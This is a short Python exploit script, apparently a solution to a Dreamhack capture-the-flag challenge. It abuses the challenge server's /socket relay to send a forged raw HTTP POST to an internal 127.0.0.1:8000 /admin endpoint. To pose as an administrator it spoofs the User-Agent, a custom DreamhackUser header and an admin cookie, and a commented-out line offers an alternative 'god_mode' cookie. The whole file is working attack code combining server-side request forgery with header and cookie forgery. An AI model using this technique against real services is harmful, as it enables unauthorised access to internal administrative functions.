import requests

url = "http://host3.dreamhack.games:10371/socket"

inner_body = "userid=admin"
body_length = len(inner_body)

payload = (
  "POST /admin HTTP/1.1\r\n"
  "HOST: 127.0.0.1:8000\r\n"
  "User-Agent: Admin Browser\r\n"
  "DreamhackUser: admin\r\n"
  "Cookie: admin=true\r\n"    #"Cookie: auth_token=god_mode; role=admin\r\n"
  "Content-Type: application/x-www-form-urlencoded\r\n"
  f"Content-Length: {body_length}\r\n"
  "Connection: close\r\n"
  "\r\n"
  f"{inner_body}"
)

data = {
  'host' : '127.0.0.1',
  'port' : '8000',
  'data' : payload
}

res = requests.post(url, data=data)
print(res.text)
